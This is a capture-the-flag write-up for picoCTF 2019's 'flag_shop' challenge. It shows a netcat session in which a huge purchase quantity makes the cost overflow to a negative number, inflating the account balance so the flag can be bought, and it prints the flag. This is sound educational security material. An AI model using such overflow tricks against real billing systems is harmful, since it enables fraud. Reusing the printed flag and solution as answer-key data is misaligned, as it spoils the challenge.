# flag_shop
**300 points**
## Description
> There's a flag shop selling stuff, can you buy a flag? [Source](store.c). Connect with `nc 2019shell1.picoctf.com 11177`.
## Hints
> Two's compliment can do some weird things when numbers get really big!
---
## Writeup
According to the source code, we can utilize integer overflow at `Buy Flags/Definitely not the flag Flag` to earn enough money to buy `1337 flag` since it doesn't have boundaries check nor does it check if total_cost is negative.

```shell
$ nc 2019shell1.picoctf.com 11177
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386100

The final cost is: -2147477296

Your current balance after transaction: 2147478396

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_b9f469b5}
```

flag : picoCTF{m0n3y_bag5_b9f469b5}